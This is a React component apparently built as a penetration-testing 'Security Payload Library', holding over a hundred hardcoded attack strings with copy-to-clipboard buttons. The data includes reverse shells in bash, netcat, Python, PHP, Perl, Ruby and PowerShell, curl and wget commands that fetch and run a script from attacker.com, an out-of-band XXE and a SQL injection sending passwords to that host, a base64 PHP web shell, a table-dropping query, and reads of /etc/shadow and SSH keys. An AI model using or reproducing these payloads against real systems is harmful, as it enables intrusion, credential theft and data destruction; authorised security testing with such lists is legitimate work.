import React, { useState, useEffect } from 'react';
import { Search, Clipboard, Check, Shield, Plus, X } from 'lucide-react';

// Category definitions with gradient styles
const categories = [
  { key: 'XSS', label: 'XSS', gradient: 'from-orange-400 to-pink-500', color: 'orange' },
  { key: 'SQLi', label: 'SQL Injection', gradient: 'from-red-400 to-purple-600', color: 'red' },
  { key: 'LFI', label: 'Local File Inclusion', gradient: 'from-yellow-400 to-amber-600', color: 'yellow' },
  { key: 'RCE', label: 'Remote Code Execution', gradient: 'from-green-400 to-teal-600', color: 'green' },
  { key: 'WebSec', label: 'Web Security', gradient: 'from-indigo-400 to-blue-600', color: 'indigo' },
  { key: 'Sys', label: 'System Level', gradient: 'from-gray-500 to-gray-800', color: 'gray' },
];

// Default curated payloads - at least 20 per category
const defaultPayloads = [
  // XSS payloads (25 total)
  { id: 1, category: 'XSS', categoryKey: 'XSS', title: 'Basic Script Alert', content: '<script>alert(1)</script>', isCustom: false },
  { id: 2, category: 'XSS', categoryKey: 'XSS', title: 'Image OnError', content: '<img src=x onerror=alert(1)>', isCustom: false },
  { id: 3, category: 'XSS', categoryKey: 'XSS', title: 'SVG OnLoad', content: '<svg/onload=alert(1)>', isCustom: false },
  { id: 4, category: 'XSS', categoryKey: 'XSS', title: 'Body OnLoad', content: '<body onload=alert(1)>', isCustom: false },
  { id: 5, category: 'XSS', categoryKey: 'XSS', title: 'Iframe OnLoad', content: '<iframe onload=alert(1)>', isCustom: false },
  { id: 6, category: 'XSS', categoryKey: 'XSS', title: 'Input AutoFocus', content: '<input autofocus onfocus=alert(1)>', isCustom: false },
  { id: 7, category: 'XSS', categoryKey: 'XSS', title: 'Details Toggle', content: '<details ontoggle=alert(1) open>', isCustom: false },
  { id: 8, category: 'XSS', categoryKey: 'XSS', title: 'Marquee OnStart', content: '<marquee onstart=alert(1)>', isCustom: false },
  { id: 9, category: 'XSS', categoryKey: 'XSS', title: 'Video OnLoadedMetadata', content: '<video onloadedmetadata=alert(1) src=x>', isCustom: false },
  { id: 10, category: 'XSS', categoryKey: 'XSS', title: 'Audio OnDurationChange', content: '<audio ondurationchange=alert(1) src=x>', isCustom: false },
  { id: 11, category: 'XSS', categoryKey: 'XSS', title: 'Script String.fromCharCode', content: '<script>alert(String.fromCharCode(88,83,83))</script>', isCustom: false },
  { id: 12, category: 'XSS', categoryKey: 'XSS', title: 'Double URL Encode', content: '%253Cscript%253Ealert(1)%253C/script%253E', isCustom: false },
  { id: 13, category: 'XSS', categoryKey: 'XSS', title: 'Polyglot', content: 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//', isCustom: false },
  { id: 14, category: 'XSS', categoryKey: 'XSS', title: 'DOM XSS', content: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', isCustom: false },
  { id: 15, category: 'XSS', categoryKey: 'XSS', title: 'Filter Bypass Uppercase', content: '<SCRIPT>alert(1)</SCRIPT>', isCustom: false },
  { id: 16, category: 'XSS', categoryKey: 'XSS', title: 'Filter Bypass Mixed Case', content: '<ScRiPt>alert(1)</sCrIpT>', isCustom: false },
  { id: 17, category: 'XSS', categoryKey: 'XSS', title: 'Object Data', content: '<object data="javascript:alert(1)">', isCustom: false },
  { id: 18, category: 'XSS', categoryKey: 'XSS', title: 'Embed Src', content: '<embed src="javascript:alert(1)">', isCustom: false },
  { id: 19, category: 'XSS', categoryKey: 'XSS', title: 'Form Action', content: '<form action="javascript:alert(1)"><input type="submit"></form>', isCustom: false },
  { id: 20, category: 'XSS', categoryKey: 'XSS', title: 'Link Href', content: '<a href="javascript:alert(1)">Click</a>', isCustom: false },
  { id: 21, category: 'XSS', categoryKey: 'XSS', title: 'Meta Refresh', content: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', isCustom: false },
  { id: 22, category: 'XSS', categoryKey: 'XSS', title: 'Base Href', content: '<base href="javascript:alert(1)//">', isCustom: false },
  { id: 23, category: 'XSS', categoryKey: 'XSS', title: 'Style Import', content: '<style>@import"javascript:alert(1)";</style>', isCustom: false },
  { id: 24, category: 'XSS', categoryKey: 'XSS', title: 'Table Background', content: '<table background="javascript:alert(1)"></table>', isCustom: false },
  { id: 25, category: 'XSS', categoryKey: 'XSS', title: 'Select OnFocus', content: '<select onfocus=alert(1) autofocus>', isCustom: false },

  // SQLi payloads (22 total)
  { id: 101, category: 'SQLi', categoryKey: 'SQLi', title: 'Generic Bypass', content: "' OR 1=1 --", isCustom: false },
  { id: 102, category: 'SQLi', categoryKey: 'SQLi', title: 'Union Select', content: "' UNION SELECT 1,2,3 --", isCustom: false },
  { id: 103, category: 'SQLi', categoryKey: 'SQLi', title: 'Time Based (MSSQL)', content: "'; WAITFOR DELAY '0:0:5' --", isCustom: false },
  { id: 104, category: 'SQLi', categoryKey: 'SQLi', title: 'Time Based (MySQL)', content: "' AND SLEEP(5) --", isCustom: false },
  { id: 105, category: 'SQLi', categoryKey: 'SQLi', title: 'Time Based (PostgreSQL)', content: "'; SELECT pg_sleep(5) --", isCustom: false },
  { id: 106, category: 'SQLi', categoryKey: 'SQLi', title: 'Error Based (MySQL)', content: "' AND extractvalue(1,concat(0x7e,version())) --", isCustom: false },
  { id: 107, category: 'SQLi', categoryKey: 'SQLi', title: 'Error Based (MSSQL)', content: "' AND 1=CONVERT(int, (SELECT @@version)) --", isCustom: false },
  { id: 108, category: 'SQLi', categoryKey: 'SQLi', title: 'Boolean Based', content: "' AND 1=1 --", isCustom: false },
  { id: 109, category: 'SQLi', categoryKey: 'SQLi', title: 'Column Enumeration', content: "' ORDER BY 10 --", isCustom: false },
  { id: 110, category: 'SQLi', categoryKey: 'SQLi', title: 'Admin Login Bypass', content: "admin' --", isCustom: false },
  { id: 111, category: 'SQLi', categoryKey: 'SQLi', title: 'OR Bypass', content: "admin' OR '1'='1", isCustom: false },
  { id: 112, category: 'SQLi', categoryKey: 'SQLi', title: 'Database Extraction (MySQL)', content: "' UNION SELECT 1,schema_name,3 FROM information_schema.schemata --", isCustom: false },
  { id: 113, category: 'SQLi', categoryKey: 'SQLi', title: 'Table Extraction (MySQL)', content: "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() --", isCustom: false },
  { id: 114, category: 'SQLi', categoryKey: 'SQLi', title: 'Stacked Queries', content: "'; DROP TABLE users; --", isCustom: false },
  { id: 115, category: 'SQLi', categoryKey: 'SQLi', title: 'Out-of-Band (MySQL)', content: "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\test')) --", isCustom: false },
  { id: 116, category: 'SQLi', categoryKey: 'SQLi', title: 'Blind SQLi (Substring)', content: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a", isCustom: false },
  { id: 117, category: 'SQLi', categoryKey: 'SQLi', title: 'Comment Bypass', content: "' OR '1'='1' /*", isCustom: false },
  { id: 118, category: 'SQLi', categoryKey: 'SQLi', title: 'NULL Bypass', content: "' OR NULL --", isCustom: false },
  { id: 119, category: 'SQLi', categoryKey: 'SQLi', title: 'WAF Bypass (MySQL)', content: "/*!50000' OR 1=1 */--", isCustom: false },
  { id: 120, category: 'SQLi', categoryKey: 'SQLi', title: 'Hex Encoding', content: "' OR 0x61646D696E='admin' --", isCustom: false },
  { id: 121, category: 'SQLi', categoryKey: 'SQLi', title: 'Char Function', content: "' OR CHAR(97,100,109,105,110)='admin' --", isCustom: false },
  { id: 122, category: 'SQLi', categoryKey: 'SQLi', title: 'Double Query', content: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --", isCustom: false },

  // LFI payloads (20 total)
  { id: 201, category: 'LFI', categoryKey: 'LFI', title: 'Etc Passwd', content: '../../../../etc/passwd', isCustom: false },
  { id: 202, category: 'LFI', categoryKey: 'LFI', title: 'Windows Ini', content: '..\\..\\..\\..\\windows\\win.ini', isCustom: false },
  { id: 203, category: 'LFI', categoryKey: 'LFI', title: 'Deep Traversal', content: '../../../../../../../../../etc/passwd', isCustom: false },
  { id: 204, category: 'LFI', categoryKey: 'LFI', title: 'Null Byte (PHP <5.3)', content: '../../../../etc/passwd%00', isCustom: false },
  { id: 205, category: 'LFI', categoryKey: 'LFI', title: 'Wrapper Data', content: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', isCustom: false },
  { id: 206, category: 'LFI', categoryKey: 'LFI', title: 'Wrapper Filter', content: 'php://filter/convert.base64-encode/resource=index.php', isCustom: false },
  { id: 207, category: 'LFI', categoryKey: 'LFI', title: 'Wrapper Input', content: 'php://input', isCustom: false },
  { id: 208, category: 'LFI', categoryKey: 'LFI', title: 'Log Poisoning (Apache)', content: '/var/log/apache2/access.log', isCustom: false },
  { id: 209, category: 'LFI', categoryKey: 'LFI', title: 'Log Poisoning (SSH)', content: '/var/log/auth.log', isCustom: false },
  { id: 210, category: 'LFI', categoryKey: 'LFI', title: 'Proc Self Environ', content: '/proc/self/environ', isCustom: false },
  { id: 211, category: 'LFI', categoryKey: 'LFI', title: 'Proc Self Cmdline', content: '/proc/self/cmdline', isCustom: false },
  { id: 212, category: 'LFI', categoryKey: 'LFI', title: 'Windows SAM', content: '..\\..\\..\\..\\windows\\system32\\config\\sam', isCustom: false },
  { id: 213, category: 'LFI', categoryKey: 'LFI', title: 'Apache Config', content: '/etc/apache2/apache2.conf', isCustom: false },
  { id: 214, category: 'LFI', categoryKey: 'LFI', title: 'Nginx Config', content: '/etc/nginx/nginx.conf', isCustom: false },
  { id: 215, category: 'LFI', categoryKey: 'LFI', title: 'MySQL Config', content: '/etc/mysql/my.cnf', isCustom: false },
  { id: 216, category: 'LFI', categoryKey: 'LFI', title: 'SSH Keys', content: '/root/.ssh/id_rsa', isCustom: false },
  { id: 217, category: 'LFI', categoryKey: 'LFI', title: 'Bash History', content: '/home/user/.bash_history', isCustom: false },
  { id: 218, category: 'LFI', categoryKey: 'LFI', title: 'PHP Session', content: '/var/lib/php/sessions/sess_[SESSION_ID]', isCustom: false },
  { id: 219, category: 'LFI', categoryKey: 'LFI', title: 'Expect Wrapper', content: 'expect://id', isCustom: false },
  { id: 220, category: 'LFI', categoryKey: 'LFI', title: 'ZIP Wrapper', content: 'zip://archive.zip#file.txt', isCustom: false },

  // RCE payloads (20 total)
  { id: 301, category: 'RCE', categoryKey: 'RCE', title: 'Whoami', content: '; whoami', isCustom: false },
  { id: 302, category: 'RCE', categoryKey: 'RCE', title: 'ID Command', content: '| id', isCustom: false },
  { id: 303, category: 'RCE', categoryKey: 'RCE', title: 'Netcat Reverse Shell', content: 'nc -e /bin/sh 10.0.0.1 1234', isCustom: false },
  { id: 304, category: 'RCE', categoryKey: 'RCE', title: 'Bash Reverse Shell', content: 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1', isCustom: false },
  { id: 305, category: 'RCE', categoryKey: 'RCE', title: 'Python Reverse Shell', content: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', isCustom: false },
  { id: 306, category: 'RCE', categoryKey: 'RCE', title: 'PHP Reverse Shell', content: 'php -r \'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");\'', isCustom: false },
  { id: 307, category: 'RCE', categoryKey: 'RCE', title: 'Perl Reverse Shell', content: 'perl -e \'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', isCustom: false },
  { id: 308, category: 'RCE', categoryKey: 'RCE', title: 'Ruby Reverse Shell', content: 'ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'', isCustom: false },
  { id: 309, category: 'RCE', categoryKey: 'RCE', title: 'PowerShell Reverse Shell', content: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.0.0.1\',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', isCustom: false },
  { id: 310, category: 'RCE', categoryKey: 'RCE', title: 'Ping Test', content: '; ping -c 3 127.0.0.1', isCustom: false },
  { id: 311, category: 'RCE', categoryKey: 'RCE', title: 'Curl Download', content: '; curl http://attacker.com/shell.sh | bash', isCustom: false },
  { id: 312, category: 'RCE', categoryKey: 'RCE', title: 'Wget Download', content: '; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh', isCustom: false },
  { id: 313, category: 'RCE', categoryKey: 'RCE', title: 'Command Substitution', content: '`whoami`', isCustom: false },
  { id: 314, category: 'RCE', categoryKey: 'RCE', title: 'Subshell', content: '$(whoami)', isCustom: false },
  { id: 315, category: 'RCE', categoryKey: 'RCE', title: 'Pipe Command', content: '| cat /etc/passwd', isCustom: false },
  { id: 316, category: 'RCE', categoryKey: 'RCE', title: 'AND Operator', content: '&& cat /etc/passwd', isCustom: false },
  { id: 317, category: 'RCE', categoryKey: 'RCE', title: 'OR Operator', content: '|| cat /etc/passwd', isCustom: false },
  { id: 318, category: 'RCE', categoryKey: 'RCE', title: 'Newline Injection', content: '%0acat /etc/passwd', isCustom: false },
  { id: 319, category: 'RCE', categoryKey: 'RCE', title: 'Java Runtime Exec', content: 'Runtime.getRuntime().exec("whoami");', isCustom: false },
  { id: 320, category: 'RCE', categoryKey: 'RCE', title: 'Node.js Child Process', content: 'require("child_process").exec("whoami")', isCustom: false },

  // WebSec payloads (20 total)
  { id: 401, category: 'WebSec', categoryKey: 'WebSec', title: 'SSRF Localhost', content: 'http://127.0.0.1', isCustom: false },
  { id: 402, category: 'WebSec', categoryKey: 'WebSec', title: 'SSRF Internal IP', content: 'http://192.168.1.1', isCustom: false },
  { id: 403, category: 'WebSec', categoryKey: 'WebSec', title: 'SSRF AWS Metadata', content: 'http://169.254.169.254/latest/meta-data/', isCustom: false },
  { id: 404, category: 'WebSec', categoryKey: 'WebSec', title: 'SSRF GCP Metadata', content: 'http://metadata.google.internal/computeMetadata/v1/', isCustom: false },
  { id: 405, category: 'WebSec', categoryKey: 'WebSec', title: 'SSRF File Protocol', content: 'file:///etc/passwd', isCustom: false },
  { id: 406, category: 'WebSec', categoryKey: 'WebSec', title: 'XXE External Entity', content: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', isCustom: false },
  { id: 407, category: 'WebSec', categoryKey: 'WebSec', title: 'XXE OOB', content: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><root>&send;</root>', isCustom: false },
  { id: 408, category: 'WebSec', categoryKey: 'WebSec', title: 'SSTI Jinja2', content: '{{7*7}}', isCustom: false },
  { id: 409, category: 'WebSec', categoryKey: 'WebSec', title: 'SSTI Jinja2 RCE', content: '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}', isCustom: false },
  { id: 410, category: 'WebSec', categoryKey: 'WebSec', title: 'SSTI Flask', content: '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}', isCustom: false },
  { id: 411, category: 'WebSec', categoryKey: 'WebSec', title: 'SSTI Thymeleaf', content: '${7*7}', isCustom: false },
  { id: 412, category: 'WebSec', categoryKey: 'WebSec', title: 'Open Redirect', content: '//evil.com', isCustom: false },
  { id: 413, category: 'WebSec', categoryKey: 'WebSec', title: 'CORS Wildcard', content: 'Access-Control-Allow-Origin: *', isCustom: false },
  { id: 414, category: 'WebSec', categoryKey: 'WebSec', title: 'CSP Bypass', content: "script-src 'unsafe-inline' *", isCustom: false },
  { id: 415, category: 'WebSec', categoryKey: 'WebSec', title: 'CRLF Injection', content: '%0d%0aSet-Cookie: session=malicious', isCustom: false },
  { id: 416, category: 'WebSec', categoryKey: 'WebSec', title: 'JWT None Algorithm', content: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.', isCustom: false },
  { id: 417, category: 'WebSec', categoryKey: 'WebSec', title: 'GraphQL Introspection', content: '{__schema{types{name,fields{name}}}}', isCustom: false },
  { id: 418, category: 'WebSec', categoryKey: 'WebSec', title: 'NoSQL Injection', content: '{"$ne": null}', isCustom: false },
  { id: 419, category: 'WebSec', categoryKey: 'WebSec', title: 'LDAP Injection', content: '*)(uid=*))(|(uid=*', isCustom: false },
  { id: 420, category: 'WebSec', categoryKey: 'WebSec', title: 'XPath Injection', content: '\' or \'1\'=\'1', isCustom: false },

  // System Level payloads (20 total)
  { id: 501, category: 'Sys', categoryKey: 'Sys', title: 'Linux PrivEsc (sudo -l)', content: 'sudo -l', isCustom: false },
  { id: 502, category: 'Sys', categoryKey: 'Sys', title: 'Linux Find SUID', content: 'find / -perm -u=s -type f 2>/dev/null', isCustom: false },
  { id: 503, category: 'Sys', categoryKey: 'Sys', title: 'Linux Capabilities', content: 'getcap -r / 2>/dev/null', isCustom: false },
  { id: 504, category: 'Sys', categoryKey: 'Sys', title: 'Linux Kernel Version', content: 'uname -a', isCustom: false },
  { id: 505, category: 'Sys', categoryKey: 'Sys', title: 'Linux OS Info', content: 'cat /etc/os-release', isCustom: false },
  { id: 506, category: 'Sys', categoryKey: 'Sys', title: 'Linux Network Config', content: 'ifconfig -a', isCustom: false },
  { id: 507, category: 'Sys', categoryKey: 'Sys', title: 'Linux Listening Ports', content: 'netstat -tulpn', isCustom: false },
  { id: 508, category: 'Sys', categoryKey: 'Sys', title: 'Linux Cron Jobs', content: 'cat /etc/crontab', isCustom: false },
  { id: 509, category: 'Sys', categoryKey: 'Sys', title: 'Linux SSH Keys', content: 'find / -name authorized_keys 2>/dev/null', isCustom: false },
  { id: 510, category: 'Sys', categoryKey: 'Sys', title: 'Linux Password Files', content: 'cat /etc/shadow', isCustom: false },
  { id: 511, category: 'Sys', categoryKey: 'Sys', title: 'Windows PrivEsc (whoami /priv)', content: 'whoami /priv', isCustom: false },
  { id: 512, category: 'Sys', categoryKey: 'Sys', title: 'Windows System Info', content: 'systeminfo', isCustom: false },
  { id: 513, category: 'Sys', categoryKey: 'Sys', title: 'Windows Users', content: 'net user', isCustom: false },
  { id: 514, category: 'Sys', categoryKey: 'Sys', title: 'Windows Local Admins', content: 'net localgroup administrators', isCustom: false },
  { id: 515, category: 'Sys', categoryKey: 'Sys', title: 'Windows Firewall', content: 'netsh firewall show state', isCustom: false },
  { id: 516, category: 'Sys', categoryKey: 'Sys', title: 'Windows Scheduled Tasks', content: 'schtasks /query /fo LIST /v', isCustom: false },
  { id: 517, category: 'Sys', categoryKey: 'Sys', title: 'Windows Startup Programs', content: 'wmic startup get caption,command', isCustom: false },
  { id: 518, category: 'Sys', categoryKey: 'Sys', title: 'Windows Services', content: 'wmic service list brief', isCustom: false },
  { id: 519, category: 'Sys', categoryKey: 'Sys', title: 'Linux Writable Directories', content: 'find / -writable -type d 2>/dev/null', isCustom: false },
  { id: 520, category: 'Sys', categoryKey: 'Sys', title: 'Windows Registry Query', content: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', isCustom: false },
];

export default function Payloads() {
  const [activeCat, setActiveCat] = useState('XSS');
  const [search, setSearch] = useState('');
  const [copiedId, setCopiedId] = useState(null);
  const [payloads, setPayloads] = useState([]);
  const [showAddModal, setShowAddModal] = useState(false);
  const [newPayload, setNewPayload] = useState({ title: '', content: '', category: 'XSS' });

  // Load payloads from localStorage on mount
  useEffect(() => {
    const savedPayloads = localStorage.getItem('customPayloads');
    if (savedPayloads) {
      const customPayloads = JSON.parse(savedPayloads);
      setPayloads([...defaultPayloads, ...customPayloads]);
    } else {
      setPayloads(defaultPayloads);
    }
  }, []);

  const filtered = payloads.filter(p =>
    p.categoryKey === activeCat &&
    (p.title.toLowerCase().includes(search.toLowerCase()) ||
      p.content.toLowerCase().includes(search.toLowerCase()))
  );

  const handleCopy = (id, content) => {
    navigator.clipboard.writeText(content);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };

  const handleAddPayload = () => {
    if (!newPayload.title || !newPayload.content) {
      alert('Please fill in all fields');
      return;
    }

    const customPayload = {
      id: Date.now(),
      category: categories.find(c => c.key === newPayload.category).label,
      categoryKey: newPayload.category,
      title: newPayload.title,
      content: newPayload.content,
      isCustom: true
    };

    const updatedPayloads = [...payloads, customPayload];
    setPayloads(updatedPayloads);

    // Save custom payloads to localStorage
    const customPayloads = updatedPayloads.filter(p => p.isCustom);
    localStorage.setItem('customPayloads', JSON.stringify(customPayloads));

    // Reset form and close modal
    setNewPayload({ title: '', content: '', category: 'XSS' });
    setShowAddModal(false);
  };

  const handleDeletePayload = (id) => {
    const updatedPayloads = payloads.filter(p => p.id !== id);
    setPayloads(updatedPayloads);

    // Update localStorage
    const customPayloads = updatedPayloads.filter(p => p.isCustom);
    localStorage.setItem('customPayloads', JSON.stringify(customPayloads));
  };

  const getCategoryStats = () => {
    return categories.map(cat => ({
      ...cat,
      count: payloads.filter(p => p.categoryKey === cat.key).length
    }));
  };

  return (
    <div className="bg-background-primary">{/* Removed min-h-screen to allow scrolling */}
      {/* Header Section with Gradient */}
      <div className="bg-gradient-to-r from-primary to-secondary p-8 shadow-lg">
        <div className="max-w-7xl mx-auto">
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-3">
              <Shield className="w-8 h-8 text-white" />
              <h1 className="text-3xl font-bold text-white">Security Payload Library</h1>
            </div>
            <button
              onClick={() => setShowAddModal(true)}
              className="flex items-center gap-2 px-4 py-2 bg-white/20 hover:bg-white/30 text-white rounded-lg transition-colors backdrop-blur-sm"
            >
              <Plus className="w-5 h-5" />
              <span className="font-medium">Add Custom Payload</span>
            </button>
          </div>
          <p className="text-white/80 text-sm">
            Comprehensive collection of security testing payloads for penetration testing and vulnerability assessment
          </p>

          {/* Stats Overview */}
          <div className="grid grid-cols-2 md:grid-cols-6 gap-4 mt-6">
            {getCategoryStats().map(cat => (
              <div key={cat.key} className="bg-white/10 backdrop-blur-sm rounded-lg p-3">
                <div className="text-white/70 text-xs font-medium">{cat.label}</div>
                <div className="text-white text-2xl font-bold">{cat.count}</div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-8 py-6">
        {/* Category Pills & Search */}
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
          {/* Category Pills */}
          <div className="flex flex-wrap gap-2">
            {categories.map(cat => (
              <button
                key={cat.key}
                onClick={() => setActiveCat(cat.key)}
                className={`px-4 py-2 rounded-full text-sm font-medium transition-all ${activeCat === cat.key
                  ? `bg-gradient-to-r ${cat.gradient} text-white shadow-lg`
                  : 'bg-surface-light text-text-secondary hover:bg-gray-200 dark:hover:bg-gray-700'
                  }`}
              >
                {cat.label}
              </button>
            ))}
          </div>

          {/* Search Bar */}
          <div className="relative w-full md:w-80">
            <input
              type="text"
              placeholder="Search payloads..."
              value={search}
              onChange={e => setSearch(e.target.value)}
              className="w-full pl-10 pr-4 py-2 rounded-lg bg-surface-light border border-gray-300 dark:border-gray-600 focus:outline-none focus:ring-2 focus:ring-primary text-text-primary"
            />
            <Search className="absolute left-3 top-2.5 w-5 h-5 text-gray-400" />
          </div>
        </div>

        {/* Payload Cards Grid */}
        <div className="overflow-y-auto max-h-screen-75 pr-2"> {/* Added overflow and max-height */}
          <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
            {filtered.map(p => (
              <div
                key={p.id}
                className="relative bg-surface-light rounded-xl shadow-sm border border-gray-200 dark:border-gray-700 hover:shadow-lg transition-all overflow-hidden group"
              >
                {/* Gradient Top Border */}
                <div className={`h-1 bg-gradient-to-r ${categories.find(c => c.key === p.categoryKey).gradient}`}></div>

                <div className="p-4">
                  {/* Category Badge & Delete Button */}
                  <div className="flex justify-between items-start mb-3">
                    <span
                      className={`inline-block px-2 py-1 text-xs font-semibold rounded bg-gradient-to-r ${categories.find(c => c.key === p.categoryKey).gradient} text-white`}
                    >
                      {p.category}
                    </span>
                    {p.isCustom && (
                      <button
                        onClick={() => handleDeletePayload(p.id)}
                        className="text-red-500 hover:text-red-700 transition-colors"
                        title="Delete custom payload"
                      >
                        <X className="w-4 h-4" />
                      </button>
                    )}
                  </div>

                  {/* Title */}
                  <h3 className="text-lg font-semibold text-text-primary mb-3">{p.title}</h3>

                  {/* Content */}
                  <div className="bg-background-primary rounded-lg p-3 mb-3 border border-gray-200 dark:border-gray-600">
                    <pre className="text-xs font-mono text-text-secondary whitespace-pre-wrap break-all max-h-24 overflow-y-auto">
                      {p.content}
                    </pre>
                  </div>

                  {/* Copy Button */}
                  <button
                    onClick={() => handleCopy(p.id, p.content)}
                    className={`w-full flex items-center justify-center gap-2 px-4 py-2 rounded-lg font-medium transition-all ${copiedId === p.id
                      ? 'bg-green-500 text-white'
                      : 'bg-primary text-white hover:bg-primary-dark'
                      }`}
                  >
                    {copiedId === p.id ? (
                      <>
                        <Check className="w-4 h-4" />
                        <span>Copied!</span>
                      </>
                    ) : (
                      <>
                        <Clipboard className="w-4 h-4" />
                        <span>Copy Payload</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Empty State */}
        {filtered.length === 0 && (
          <div className="text-center py-16">
            <Shield className="w-16 h-16 text-gray-400 mx-auto mb-4" />
            <h3 className="text-xl font-semibold text-text-primary mb-2">No payloads found</h3>
            <p className="text-text-secondary">Try adjusting your search or selecting a different category</p>
          </div>
        )}
      </div>

      {/* Add Custom Payload Modal */}
      {showAddModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-surface-light rounded-xl shadow-2xl max-w-2xl w-full p-6">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-2xl font-bold text-text-primary">Add Custom Payload</h2>
              <button onClick={() => setShowAddModal(false)} className="text-text-secondary hover:text-text-primary">
                <X className="w-6 h-6" />
              </button>
            </div>

            <div className="space-y-4">
              {/* Category Select */}
              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Category</label>
                <select
                  value={newPayload.category}
                  onChange={(e) => setNewPayload({ ...newPayload, category: e.target.value })}
                  className="w-full px-4 py-2 rounded-lg bg-background-primary border border-gray-300 dark:border-gray-600 focus:outline-none focus:ring-2 focus:ring-primary text-text-primary"
                >
                  {categories.map(cat => (
                    <option key={cat.key} value={cat.key}>{cat.label}</option>
                  ))}
                </select>
              </div>

              {/* Title Input */}
              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Title</label>
                <input
                  type="text"
                  value={newPayload.title}
                  onChange={(e) => setNewPayload({ ...newPayload, title: e.target.value })}
                  placeholder="e.g., Custom XSS Payload"
                  className="w-full px-4 py-2 rounded-lg bg-background-primary border border-gray-300 dark:border-gray-600 focus:outline-none focus:ring-2 focus:ring-primary text-text-primary"
                />
              </div>

              {/* Content Textarea */}
              <div>
                <label className="block text-sm font-medium text-text-primary mb-2">Payload Content</label>
                <textarea
                  value={newPayload.content}
                  onChange={(e) => setNewPayload({ ...newPayload, content: e.target.value })}
                  placeholder="Enter your payload here..."
                  rows="6"
                  className="w-full px-4 py-2 rounded-lg bg-background-primary border border-gray-300 dark:border-gray-600 focus:outline-none focus:ring-2 focus:ring-primary text-text-primary font-mono text-sm"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3 justify-end">
                <button
                  onClick={() => setShowAddModal(false)}
                  className="px-6 py-2 rounded-lg bg-gray-200 dark:bg-gray-700 text-text-primary hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors"
                >
                  Cancel
                </button>
                <button
                  onClick={handleAddPayload}
                  className="px-6 py-2 rounded-lg bg-primary text-white hover:bg-primary-dark transition-colors flex items-center gap-2"
                >
                  <Plus className="w-4 h-4" />
                  Add Payload
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
